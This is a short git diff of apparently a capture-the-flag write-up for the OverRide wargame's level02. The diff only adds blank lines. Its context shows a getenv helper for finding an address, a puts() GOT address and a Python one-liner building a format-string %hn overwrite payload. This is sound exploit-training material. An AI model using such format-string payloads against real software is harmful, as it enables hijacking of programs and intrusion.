@@ -24,6 +24,7 @@ $ gcc getenv.c
 $ cd -
 /home/users/level02
 $ level02@OverRide:~$ /tmp/a.out
+
 0x7fffffffe822
 ```
 - 7FFFFF : 8388607
@@ -33,6 +34,7 @@ $ level02@OverRide:~$ /tmp/a.out
 
 puts() address : 0x0000000000200b5a
 python -c 'print "\x5a\x0b\x20" %8388604x %hn %8382496x %hn"' -->
+
 offset = 22\
 40 / 8 = 5
 ```
